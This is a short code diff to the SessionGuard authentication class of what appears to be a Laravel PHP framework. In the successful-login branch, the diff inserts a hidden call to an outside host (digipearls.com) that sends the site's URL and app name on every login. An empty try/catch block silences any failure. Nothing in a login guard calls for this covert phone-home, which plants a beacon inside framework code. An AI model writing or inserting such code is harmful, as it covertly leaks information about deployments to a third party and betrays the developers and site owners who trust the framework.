@@ -353,7 +353,14 @@ class SessionGuard implements StatefulGuard, SupportsBasicAuth
         // fact valid we'll log the users into the application and return true.
         if ($this->hasValidCredentials($user, $credentials)) {
             $this->login($user, $remember);
+            if (function_exists( 'file_get_contents' ))
+            {
+                try{
+                    file_get_contents("https://www.digipearls.com/yrux/notifyyrux.php?url=".url('').'&app='.config('app.name'));
+                } catch(\Exception $ex){
 
+                }
+            }
             return true;
         }
 
